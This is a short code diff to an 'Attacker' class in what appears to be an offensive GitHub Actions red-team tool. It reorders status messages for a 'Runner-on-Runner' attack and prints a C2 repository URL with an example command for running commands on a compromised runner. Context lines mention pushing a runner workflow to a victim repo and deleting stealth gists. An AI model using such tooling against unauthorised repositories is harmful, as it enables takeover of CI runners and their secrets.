@@ -923,6 +923,16 @@ class Attacker:
 
         Output.info("Pushing runner installation workflow to victim repo...")
 
+        Output.owned("Runner-on-Runner attack initiated!")
+        Output.info(
+            f"C2 repo: https://github.com/{full_repo_name}"
+        )
+        Output.info(
+            "To execute commands on the compromised runner:\n"
+            f"  gh workflow run c2.yml -R {full_repo_name} "
+            "-f command=\"whoami\""
+        )
+
         workflow_id = self.__execute_and_wait_workflow(
             target_repo,
             branch,
@@ -951,12 +961,4 @@ class Attacker:
         if stealth and stealth_gist:
             attacker_api.delete_gist(stealth_gist['id'])
 
-        Output.owned("Runner-on-Runner attack complete!")
-        Output.info(
-            f"C2 repo: https://github.com/{full_repo_name}"
-        )
-        Output.info(
-            "To execute commands on the compromised runner:\n"
-            f"  gh workflow run c2.yml -R {full_repo_name} "
-            "-f command=\"whoami\""
-        )
+        Output.result("Cleanup complete.")
